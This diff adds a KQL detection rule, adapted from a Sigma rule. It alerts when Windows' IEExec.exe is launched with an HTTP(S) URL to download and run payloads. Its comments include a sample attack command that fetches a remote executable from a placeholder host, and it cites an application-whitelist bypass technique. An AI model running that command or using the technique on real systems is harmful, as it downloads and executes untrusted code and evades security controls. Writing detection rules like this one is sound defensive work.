@@ -1,0 +1,16 @@
+// Title: Abusing IEExec To Download Payloads
+// Desc: Detects execution of the IEExec utility to download payloads
+// Notes: “The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.”
+// Ref - https://lolbas-project.github.io/lolbas/Binaries/Ieexec/
+// Ref - https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/
+// MITRE: Ingress Tool Transfer (Command and Control)
+// Severity: high
+// Trigger: ieexec.exe http://x.x.x.x:8080/bypass.exe
+// From: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/proc_creation_win_lolbin_ieexec_download.yml
+// By: Frankie Li
+// On: 15-05-2023
+DeviceProcessEvents 
+| where ((FolderPath endswith @'\IEExec.exe' or InitiatingProcessVersionInfoOriginalFileName =~ @'IEExec.exe' 
+    or ProcessVersionInfoOriginalFileName =~ @'IEExec.exe') 
+    and (ProcessCommandLine contains @'https://' or ProcessCommandLine contains @'http://'))
+| project Timestamp, DeviceName, AccountName, InitiatingProcessParentFileName, FolderPath, ProcessCommandLine
